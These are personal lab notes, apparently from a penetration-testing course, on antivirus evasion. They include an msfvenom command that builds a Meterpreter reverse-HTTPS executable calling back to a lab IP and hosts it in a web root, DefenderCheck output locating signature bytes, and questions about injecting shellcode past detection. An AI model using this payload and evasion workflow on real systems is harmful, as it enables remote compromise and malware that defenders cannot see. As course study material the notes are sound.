# Introduction to Antivirus evasion

We will look at how anti virus detection works

# Antivirus software overview

Antivirus vendors use automated processes and manual 
reverse-engineering efforts to create these signatures, which are stored in massive databases. 
While signature algorithms are often close-held secrets, most rely on MD5 or SHA-1 hashes of 
malicious files or on unique byte sequences discovered in known malicious files. If a scanned file 
matches a known hash, or contains a malicious byte sequence, it is flagged as malicious.

software performs heuristics or behavioral analysis that 
simulates execution of a scanned file. Most implementations execute the scanned file in a 
sandboxed environment, attempting to detect known malicious behavior. This approach relies on 
extremely sophisticated, proprietary code and is significantly more time-consuming and resource intensive than signature-based detection methods. The success rate of this approach varies 
widely from vendor to vendor

# simulating virus environemnt

virus total

antiscan.me

# Locating signatures in the file

For this exercise, we must disable the heuristics-based scanning portion of the antivirus engine. 
In this section, we are going to rely on ClamAV, which is preinstalled on the Windows 10 victim 
machine and has its heuristics engine disabled.

Using Dsplit, Find-AVSignature PowerSHell script

```
└─# msfvenom -p windows/x64/meterpreter/reverse_https -a x64  LHOST=10.10.6.12 LPORT=4443 EXITFUNC=thread -f exe -o /var/www/html/met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 700 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/met.exe
                                
```

```
Import Find-AvSignature.ps1
```

Not able to run 

```
VERBOSE: StartByte: 0
VERBOSE: EndByte: 7167
VERBOSE: This script will now write 1 binaries to ".\avtest1".
New-Object : Exception calling ".ctor" with "5" argument(s): "Could not find file 
'C:\Windows\system32\met.exe'."
At C:\Users\misthios\codeplay\pen300\book\chapter6\Find-AVSignature.ps1:141 char:42
+ ... eadStream = New-Object System.IO.FileStream($Path, [System.IO.FileMod ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
    + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectComm 
   and
 
VERBOSE: Byte 0 -> 0
You cannot call a method on a null-valued expression.
At C:\Users\misthios\codeplay\pen300\book\chapter6\Find-AVSignature.ps1:154 char:9
+         $ReadStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull
 
New-Object : Exception calling ".ctor" with "5" argument(s): "Could not find a part of the path 
'C:\Windows\system32\avtest1\met_0.bin'."
At C:\Users\misthios\codeplay\pen300\book\chapter6\Find-AVSignature.ps1:158 char:47
+ ... iteStream = New-Object System.IO.FileStream($outfile, [System.IO.File ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
    + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectComm 
   and
```

Trying DefenderCheck -> https://github.com/matterpreter/DefenderCheck.git

```sh
C:\Users\misthios\codeplay\DefenderCheck\DefenderCheck\DefenderCheck\bin\x64\Release>DefenderCheck.exe met.exe
[-] C:\Temp doesn't exist. Creating it...
Target file size: 7168 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x44A in the original file
File matched signature: "Trojan:Win32/Meterpreter.A!cl"

00000000   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000010   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000020   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
000000A0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
000000B0   00 00 00 00 00 00 48 83  EC 28 49 C7 C1 40 00 00   ······H?ì(IÇA@··
000000C0   00 49 C7 C0 00 30 00 00  48 C7 C2 00 10 00 00 48   ·IÇA·0··HÇA····H
000000D0   33 C9 E8 27 10 00 00 48  C7 C1 00 10 00 00 48 BE   3Éè'···HÇA····H_
000000E0   41 10 00 40 01 00 00 00  48 8B F8 F3 A4 FF D0 48   A··@····H?oó☼ÿDH
000000F0   33 C9 E8 01 10 00 00 50  41 59 4C 4F 41 44 3A 00   3Éè····PAYLOAD:·
```



and ThreatCheck -> git clone https://github.com/rasta-mouse/ThreatCheck.git





### 6.3.1.1 Exercise
1. Generate a 32-bit Meterpreter executable and use Find-AVSignature to bypass any ClamAV 
signature detections. Does the modified executable return a shell?



### creating code to reverse array

with the pe injection it works from here - 

https://www.ired.team/offensive-security/code-injection-process-injection/process-injection

scan result 5/26

Trying to evade the AV we have - https://0xhop.github.io/evasion/2021/04/19/evasion-pt1/

1. is the shellcode getting detected
WE TRIED A NEW CODE - might be getting detected need to check with calc opening shellcode.

2. can we compile it as a 32 bit program
TRIED - better performance with antivirus.

3. can we run 32 bit shellcode on 64 bit program?
Not happening

4. create a 32 bit program to inject into a 64 bit process.
